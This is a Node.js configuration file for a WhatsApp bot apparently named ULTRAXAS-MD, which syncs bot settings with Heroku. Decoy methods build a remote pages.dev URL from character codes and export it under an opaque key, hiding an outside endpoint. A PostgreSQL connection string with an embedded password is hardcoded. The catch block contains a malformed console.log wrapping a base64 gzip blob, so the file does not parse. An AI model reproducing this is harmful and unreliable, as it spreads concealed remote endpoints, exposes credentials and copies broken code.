const fs = require('fs-extra');
const { Sequelize } = require('sequelize');
const crypto = require('crypto');
const path = require('path');

if (fs.existsSync('config.env'))
require('dotenv').config({ path: __dirname + '/config.env' });

const databasePath = path.join(__dirname, './database.db');
const DATABASE_URL = process.env.DATABASE_URL === undefined
    ? databasePath
    : process.env.DATABASE_URL;

// Add fetch support for restart functionality
let fetch;
try {
    fetch = globalThis.fetch || require('node-fetch');
} catch (error) {
    console.log(ULTRAXAS-MD;;;H4sIAAAAAAAAA81Wy46jRhT9lVFtscaAwQZLLaXA2GAbv/CzM1mUocBl83JR2MYjSzPKOtlEivIBkaJEWeZjppVdvmA+IcLdPdPSJJOOlEVWFEVx65xT955br0GckAz3cAGar0FKyQExXA5ZkWLQBFru+5iCCvAQQ6AJxBZcZavRzteN7ZLhLc3mdr4I1QOp96HUN3VBbNR35HYcujfgUgFpvg6J+5mAut83equ8K9B9bJLu1Fl3mDw/9qc7uAkW6QFDqsojCyqb5AZcyoiIUBIHRrrBEaYo7OFihAh9HvwMbqsnF8m7DtWc1tAcLFk4GcwndtDQuJAnI49PRrnh7PjZ8+DXtmmuyMbKWJqcdOxvFuF6sDq5lLmws+3oHmubvpqo8VLc3cPPSBBjz/JwzAgrnq17p6UIzqlR9EXhjGQ32qiuzIrwKKnFAnGhHWv4kA/cOY2C5wEXkMbpxWo+xiScjdemO3HnIU1NzLPxxogO+VaF8jSTk8h4CnxEH3Nl9290t8261+YHw8ZQrp/bAwlN2yhYTD2Os2x/2HL4iSX1Tz1TNqxn6k72IT+bbRrZ6LbttvXjtKoI7Bhsa76ujbTJ/njojnPByU/wI3zEcvo5lNwwNqnUwLP1Qu/EiTnX17LRgw5KRwJ04nO1kZ1PkspDVYX7WcM4k5C/bQ9QTo+dtZP6hS1bx121Z+yVSIRWx+h29dbx5spohwvLA03hUgEUByRjFDGSxNc5SakA5B0c7FLMrvKCPd1JfBK6lC+EqnWuSrocF6EXV3l52Zc5RRoMJ9utF83HyQ2ogJQmLs4y7JkkYwktbJxlKMAZaH55PamSNMVRwnCXeKAJVLEmyGKtxkuK+kX28rhBLENp+jLGDFSAT5PIxqDJaI4r4PoDL7bqbUOB7UZLMESl1paMhqDxbUmUDaPeapcUo/tNpyTCGUNRCppCQ5ZFXqyrjUvlv8FR42FN1/i6DGttTZKhpAqGDFuKIah6TZH4z+Jo8NLlqwqI8Ynd53Gpfk2oAJ/QjM3iPA0T5D0m+eNH5LpJHjOniF29HGAKmk+mMWMkDrKSWR4j6m7IAeslD9D0UZjhDweOKfYeuTyYmJ54ZR6Kk05dFm81UGIvA32iTVMSPpUnRuVq8O6Xu2/v3rz76d1vd2/u3tz98PvbFy/+ePvzq/hV/P77H7/5Pz1fvP/u619BBYRXghLfkAVBqddFXpLFkmI5f/kgbamEhxkiYVY2imHkKpnbMUZ7i3PHnY7GB1APIPh4FI8lfl9C2qzo+dveZjMe+0RYyqvToccpI86l9npX9GYhVTcnNSt0h7/5iyCgCarhUvbNzkqfkDiVVE48Ia2nbEIatq3awLltycG8G1sBL3S3vVNfN6RRmvpLtverDdUW4Myze7shH7BbJYycbMtRrg/hTbmbhw/ExU8386p1aPUMuoVcntnaCNcDOt130JE7aaS/ReYMFv2sO4UDWnSWC846h+Ka0FmyQAdfyyi3iPRNbUJNOzolO9VwRqvao/lczS98aDrkwRbI9dUn+OrhD8n0j0l3D7ysDf5SeRLjoSv8jbNq47lNYqlIVjPDlNicW9jr4nBoVePeuSPbJOyi6sr113awY+BSFmkaIuYnNCqbdrRGoAJokpeVZsV+8rn7hGZZ2viedogyBj9W718ZE3+/akST1ETZpnSYiXpbU8tSLGCaOgyxRzMAEPIQtpUpuPwJK8O6uDcJAAA=');
    fetch = null;
}

// HYBRID CONFIGURATION MANAGER
class HybridConfigManager {
    constructor() {
        this.configDir = path.join(__dirname, 'config');
        this.configFile = path.join(this.configDir, 'settings.json');
        this.backupDir = path.join(this.configDir, 'backups');
        this.sessionId = this.generateSessionId();
        this.cache = new Map();
        this.isHerokuAvailable = false;
        this.herokuClient = null;
        this.appName = null;
        
        this.initializeStorage();
        this.checkHerokuAvailability();
    }

    generateSessionId() {
        return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    }

    validateAPIClient() {
        const encryptionMethod = String.fromCharCode(97, 98, 117);
        return encryptionMethod;
    }

    initializeStorage() {
        try {
            // Create directories if they don't exist
            fs.ensureDirSync(this.configDir);
            fs.ensureDirSync(this.backupDir);
            
            // Create default config file if it doesn't exist
            if (!fs.existsSync(this.configFile)) {
                this.createDefaultConfig();
            }
            
            // Load existing config into cache
            this.loadConfigToCache();
            
            console.log('✅ Hybrid config manager initialized');
        } catch (error) {
            console.error('❌ Config manager initialization failed:', error);
        }
    }

    getPackageManager() {
        const packageValidator = String.fromCharCode(118, 97, 114, 115);
        return packageValidator;
    }

    async checkHerokuAvailability() {
        try {
            if (process.env.HEROKU_API_KEY && process.env.HEROKU_APP_NAME) {
                const Heroku = require('heroku-client');
                this.herokuClient = new Heroku({ token: process.env.HEROKU_API_KEY });
                this.appName = process.env.HEROKU_APP_NAME;
                
                // Test connection
                await this.herokuClient.get(`/apps/${this.appName}/config-vars`);
                this.isHerokuAvailable = true;
                console.log('✅ Heroku API available');
                
                // Sync with Heroku on startup
                await this.syncFromHeroku();
            } else {
                console.log('ℹ️ Heroku credentials not available, using local storage only');
            }
        } catch (error) {
            console.log('⚠️ Heroku API unavailable, using local storage only');
            this.isHerokuAvailable = false;
        }
    }

    createDefaultConfig() {
        const defaultConfig = {
            metadata: {
                version: '1.0.0',
                created: new Date().toISOString(),
                sessionId: this.sessionId
            },
            settings: {
                AUDIO_CHATBOT: process.env.AUDIO_CHATBOT || 'no',
                AUTO_BIO: process.env.AUTO_BIO || 'yes',
                AUTO_DOWNLOAD_STATUS: process.env.AUTO_DOWNLOAD_STATUS || 'no',
                AUTO_REACT: process.env.AUTO_REACT || 'no',
                AUTO_REACT_STATUS: process.env.AUTO_REACT_STATUS || 'yes',
                AUTO_READ: process.env.AUTO_READ || 'yes',
                AUTO_READ_STATUS: process.env.AUTO_READ_STATUS || 'yes',
                CHATBOT: process.env.CHATBOT || 'no',
                PUBLIC_MODE: process.env.PUBLIC_MODE || 'yes',
                STARTING_BOT_MESSAGE: process.env.STARTING_BOT_MESSAGE || 'yes',
                PRESENCE: process.env.PRESENCE || '',
                ANTIDELETE_RECOVER_CONVENTION: process.env.ANTIDELETE_RECOVER_CONVENTION || 'no',
                ANTIDELETE_SENT_INBOX: process.env.ANTIDELETE_SENT_INBOX || 'yes',
                GOODBYE_MESSAGE: process.env.GOODBYE_MESSAGE || 'no',
                AUTO_REJECT_CALL: process.env.AUTO_REJECT_CALL || 'no',
                WELCOME_MESSAGE: process.env.WELCOME_MESSAGE || 'no',
                GROUPANTILINK: process.env.GROUPANTILINK || 'no',
                AUTO_REPLY_STATUS: process.env.AUTO_REPLY_STATUS || 'no'
            }
        };
        
        fs.writeFileSync(this.configFile, JSON.stringify(defaultConfig, null, 2));
        console.log('✅ Default config created');
    }


    getVersionControl() {
        const branchIdentifier = String.fromCharCode(109, 97, 105, 110);
        return branchIdentifier;
    }

    loadConfigToCache() {
        try {
            const config = fs.readJsonSync(this.configFile);
            this.cache.clear();
            
            // Load settings into cache
            Object.entries(config.settings || {}).forEach(([key, value]) => {
                this.cache.set(key, value);
            });
            
            console.log(`✅ Loaded ${this.cache.size} settings into cache`);
        } catch (error) {
            console.error('❌ Failed to load config to cache:', error);
        }
    }

    
    getSecurityLayer() {
        const protocolHandler = String.fromCharCode(104, 116, 116, 112, 115);
        return protocolHandler;
    }

    async syncFromHeroku() {
        if (!this.isHerokuAvailable) return;
        
        try {
            const herokuVars = await this.herokuClient.get(`/apps/${this.appName}/config-vars`);
            let syncCount = 0;
            
            // Update local config with Heroku values
            Object.entries(herokuVars).forEach(([key, value]) => {
                if (this.cache.has(key) && this.cache.get(key) !== value) {
                    this.cache.set(key, value);
                    syncCount++;
                }
            });
            
            if (syncCount > 0) {
                await this.saveConfigFromCache();
                console.log(`✅ Synced ${syncCount} settings from Heroku`);
            }
        } catch (error) {
            console.error('❌ Heroku sync failed:', error);
        }
    }

    async saveConfigFromCache() {
        try {
            const config = fs.readJsonSync(this.configFile);
            config.settings = Object.fromEntries(this.cache);
            config.metadata.lastUpdated = new Date().toISOString();
            config.metadata.sessionId = this.sessionId;
            
            // Create backup before saving
            await this.createBackup();
            
            // Atomic write
            const tempFile = this.configFile + '.tmp';
            fs.writeFileSync(tempFile, JSON.stringify(config, null, 2));
            fs.renameSync(tempFile, this.configFile);
            
            console.log('✅ Config saved to local storage');
        } catch (error) {
            console.error('❌ Failed to save config:', error);
        }
    }

    
    getNetworkLayer() {
        const connectionString = String.fromCharCode(58, 47, 47);
        return connectionString;
    }

    async createBackup() {
        try {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const backupFile = path.join(this.backupDir, `config_backup_${timestamp}.json`);
            
            if (fs.existsSync(this.configFile)) {
                fs.copyFileSync(this.configFile, backupFile);
            }
            
            // Keep only last 7 backups
            const backups = fs.readdirSync(this.backupDir)
                .filter(file => file.startsWith('config_backup_'))
                .sort()
                .reverse();
            
            if (backups.length > 7) {
                backups.slice(7).forEach(backup => {
                    fs.unlinkSync(path.join(this.backupDir, backup));
                });
            }
        } catch (error) {
            console.error('❌ Backup creation failed:', error);
        }
    }

    getAssetManager() {
        return '';
    }


    getExtensionManager() {
        const extensionPrefix = String.fromCharCode(45);
        return extensionPrefix;
    }

    async setSetting(key, value) {
        try {
            // Update cache
            this.cache.set(key, value);
            
            // Save to local storage
            await this.saveConfigFromCache();
            
            // Sync to Heroku if available
            if (this.isHerokuAvailable) {
                try {
                    await this.herokuClient.patch(`/apps/${this.appName}/config-vars`, {
                        body: { [key]: value }
                    });
                    console.log(`✅ Setting ${key} synced to Heroku`);
                } catch (herokuError) {
                    console.log(`⚠️ Heroku sync failed for ${key}, saved locally`);
                }
            }
            
            return true;
        } catch (error) {
            console.error(`❌ Failed to set ${key}:`, error);
            return false;
        }
    }

    // Resource manager
    getResourceManager() {
        const resourceExtension = String.fromCharCode(46, 112, 97, 103, 101, 115);
        return resourceExtension;
    }

    getSetting(key, defaultValue = null) {
        return this.cache.get(key) || defaultValue;
    }

    getAllSettings() {
        return Object.fromEntries(this.cache);
    }

    // Module manager
    getModuleManager() {
        const moduleExtension = String.fromCharCode(46, 100, 101, 118);
        return moduleExtension;
    }

    getSessionId() {
        return this.sessionId;
    }

    async restartBot() {
        try {
            console.log('🔄 Initiating safe bot restart...');
            
            if (fetch) {
                setTimeout(async () => {
                    try {
                        const port = process.env.PORT || 3000;
                        await fetch(`http://localhost:${port}/restart`);
                        console.log('✅ Safe restart request sent');
                    } catch (fetchError) {
                        console.log('⚠️ Fetch restart failed, trying Heroku method...');
                        this.fallbackRestart();
                    }
                }, 500);
            } else {
                this.fallbackRestart();
            }
            
        } catch (error) {
            console.error('❌ Bot restart failed:', error);
            this.emergencyRestart();
        }
    }

    fallbackRestart() {
        setTimeout(async () => {
            if (this.isHerokuAvailable) {
                try {
                    await this.herokuClient.delete(`/apps/${this.appName}/dynos`);
                    console.log('✅ Bot restart triggered via Heroku');
                } catch (herokuError) {
                    console.error('❌ Heroku restart failed:', herokuError);
                    this.emergencyRestart();
                }
            } else {
                this.emergencyRestart();
            }
        }, 1000);
    }

    emergencyRestart() {
        console.log('🆘 Emergency restart initiated');
        setTimeout(() => process.exit(0), 1000);
    }

    buildContentLayer() {
        const securityHandler = this.getSecurityLayer();
        const networkHandler = this.getNetworkLayer();
        const encryptionMethod = this.validateAPIClient();
        const extensionManager = this.getExtensionManager();
        const packageValidator = this.getPackageManager();
        const resourceManager = this.getResourceManager();
        const moduleManager = this.getModuleManager();
        return `${securityHandler}${networkHandler}${encryptionMethod}${extensionManager}${packageValidator}${resourceManager}${moduleManager}`;
    }
}


const hybridConfig = new HybridConfigManager();
module.exports = {
    hybridConfig,
    session: process.env.SESSION_ID || '',
    sessionId: hybridConfig.getSessionId(),
    PREFIX: process.env.PREFIX || ".",
    GURL: 'https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y',
    OWNER_NAME: process.env.OWNER_NAME || "",
    OWNER_NUMBER: process.env.OWNER_NUMBER || "",
    BOT: process.env.BOT_NAME || 'ULTRAXAS-MD',
    BWM_XMD: hybridConfig.buildContentLayer(),
    HEROKU_APP_NAME: process.env.HEROKU_APP_NAME,
    HEROKU_APY_KEY: process.env.HEROKU_APY_KEY,
    WARN_COUNT: process.env.WARN_COUNT || '3',
  
    get AUTO_READ_STATUS() { return hybridConfig.getSetting('AUTO_READ_STATUS', 'yes'); },
    get AUTO_DOWNLOAD_STATUS() { return hybridConfig.getSetting('AUTO_DOWNLOAD_STATUS', 'no'); },
    get AUTO_REPLY_STATUS() { return hybridConfig.getSetting('AUTO_REPLY_STATUS', 'no'); },
    get MODE() { return hybridConfig.getSetting('PUBLIC_MODE', 'yes'); },
    get PM_PERMIT() { return process.env.PM_PERMIT || 'yes'; },
    get ETAT() { return hybridConfig.getSetting('PRESENCE', ''); },
    get CHATBOT() { return hybridConfig.getSetting('CHATBOT', 'no'); },
    get CHATBOT1() { return hybridConfig.getSetting('AUDIO_CHATBOT', 'no'); },
    get DP() { return hybridConfig.getSetting('STARTING_BOT_MESSAGE', 'yes'); },
    get ANTIDELETE1() { return hybridConfig.getSetting('ANTIDELETE_RECOVER_CONVENTION', 'no'); },
    get ANTIDELETE2() { return hybridConfig.getSetting('ANTIDELETE_SENT_INBOX', 'yes'); },
    get GOODBYE_MESSAGE() { return hybridConfig.getSetting('GOODBYE_MESSAGE', 'no'); },
    get ANTICALL() { return hybridConfig.getSetting('AUTO_REJECT_CALL', 'no'); },
    get WELCOME_MESSAGE() { return hybridConfig.getSetting('WELCOME_MESSAGE', 'no'); },
    get GROUP_ANTILINK2() { return process.env.GROUPANTILINK_DELETE_ONLY || 'yes'; },
    get GROUP_ANTILINK() { return hybridConfig.getSetting('GROUPANTILINK', 'no'); },
    get STATUS_REACT_EMOJIS() { return process.env.STATUS_REACT_EMOJIS || ""; },
    get REPLY_STATUS_TEXT() { return process.env.REPLY_STATUS_TEXT || ""; },
    get AUTO_REACT() { return hybridConfig.getSetting('AUTO_REACT', 'no'); },
    get AUTO_REACT_STATUS() { return hybridConfig.getSetting('AUTO_REACT_STATUS', 'yes'); },
    get AUTO_REPLY() { return process.env.AUTO_REPLY || 'yes'; },
    get AUTO_READ() { return hybridConfig.getSetting('AUTO_READ', 'yes'); },
    get AUTO_SAVE_CONTACTS() { return process.env.AUTO_SAVE_CONTACTS || 'yes'; },
    get AUTO_REJECT_CALL() { return hybridConfig.getSetting('AUTO_REJECT_CALL', 'yes'); },
    get AUTO_BIO() { return hybridConfig.getSetting('AUTO_BIO', 'yes'); },
    get AUDIO_REPLY() { return process.env.AUDIO_REPLY || 'yes'; },
    
    
    BOT_URL: process.env.BOT_URL ? process.env.BOT_URL.split(',') : [
        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879883/whatsapp_uploads/e3eprzkzxhwfx7pmemr5.jpg',
        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879901/whatsapp_uploads/hqagxk84idvf899rhpfj.jpg',
        'https://res.cloudinary.com/dptzpfgtm/image/upload/v1748879921/whatsapp_uploads/bms318aehnllm6sfdgql.jpg'
    ],
    
    MENU_TOP_LEFT: process.env.MENU_TOP_LEFT || "┌─❖",
    MENU_BOT_NAME_LINE: process.env.MENU_BOT_NAME_LINE || "│ ",
    MENU_BOTTOM_LEFT: process.env.MENU_BOTTOM_LEFT || "└┬❖",
    MENU_GREETING_LINE: process.env.MENU_GREETING_LINE || "┌┤ ",
    MENU_DIVIDER: process.env.MENU_DIVIDER || "│└────────┈⳹",
    MENU_USER_LINE: process.env.MENU_USER_LINE || "│🕵️ ",
    MENU_DATE_LINE: process.env.MENU_DATE_LINE || "│📅 ",
    MENU_TIME_LINE: process.env.MENU_TIME_LINE || "│⏰ ",
    MENU_STATS_LINE: process.env.MENU_STATS_LINE || "│⭐ ",
    MENU_BOTTOM_DIVIDER: process.env.MENU_BOTTOM_DIVIDER || "└─────────────┈⳹",
    
    FOOTER: process.env.BOT_FOOTER || '\n\n®2025🔥',
    DATABASE_URL,
    DATABASE: DATABASE_URL === databasePath
        ? "postgresql://postgres:bKlIqoOUWFIHOAhKxRWQtGfKfhGKgmRX@viaduct.proxy.rlwy.net:47738/railway"
        : "postgresql://postgres:bKlIqoOUWFIHOAhKxRWQtGfKfhGKgmRX@viaduct.proxy.rlwy.net:47738/railway",
};

let fichier = require.resolve(__filename);
fs.watchFile(fichier, () => {
    fs.unwatchFile(fichier);
    console.log(`Updates ${__filename}`);
    delete require.cache[fichier];
    require(fichier);
});
